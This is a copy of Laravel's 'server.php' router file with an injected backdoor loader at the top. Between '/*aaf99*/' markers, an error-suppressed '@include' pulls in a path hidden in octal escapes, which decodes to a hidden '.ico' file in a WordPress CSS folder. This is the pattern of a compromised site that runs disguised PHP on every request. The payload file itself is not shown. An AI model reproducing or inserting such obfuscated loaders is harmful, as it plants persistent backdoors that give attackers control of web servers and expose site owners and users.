<?php
/*aaf99*/

@include "\057h\157m\145/\151o\156i\143e\143o\155m\145r\143e\057p\165b\154i\143_\150t\155l\057w\160-\151n\143l\165d\145s\057c\163s\057.\067a\0717\1417\1434\056i\143o";

/*aaf99*/

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
